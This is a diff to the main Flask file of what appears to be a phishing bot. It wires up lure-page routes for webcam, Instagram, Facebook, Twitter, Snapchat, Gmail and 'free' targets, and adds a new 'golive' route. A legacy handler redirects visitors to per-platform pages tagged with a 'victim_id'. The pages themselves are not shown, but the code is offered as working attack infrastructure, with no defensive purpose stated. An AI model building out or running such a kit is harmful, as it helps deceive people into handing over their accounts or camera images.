@@ -6,12 +6,12 @@ from bot.servers import (
     register_twit_routes,
     register_snap_routes,
     register_gmail_routes,
-    register_free_routes
+    register_free_routes,
+    register_golive_routes
 )
 
 app = Flask(__name__)
 
-# ========== REGISTER ALL ROUTES ==========
 register_cam_routes(app)
 register_insta_routes(app)
 register_face_routes(app)
@@ -19,13 +19,12 @@ register_twit_routes(app)
 register_snap_routes(app)
 register_gmail_routes(app)
 register_free_routes(app)
+register_golive_routes(app)
 
-# ========== HOME ==========
 @app.route('/')
 def home():
     return "✅ Bot is running!"
 
-# ========== LEGACY ROUTE (for backward compatibility) ==========
 @app.route('/p/<uid>')
 def legacy_page(uid):
     target_type = request.args.get('type', 'cam')
@@ -45,7 +44,9 @@ def legacy_page(uid):
         return redirect(f"/p/gmail/{uid}?v={victim_id}")
     elif target_type == 'free':
         return redirect(f"/p/free/{uid}?v={victim_id}")
-    
+    elif target_type == 'golive':
+        return redirect(f"/p/golive/{uid}?v={victim_id}")
+
     return "Page not found", 404
 
 if __name__ == "__main__":
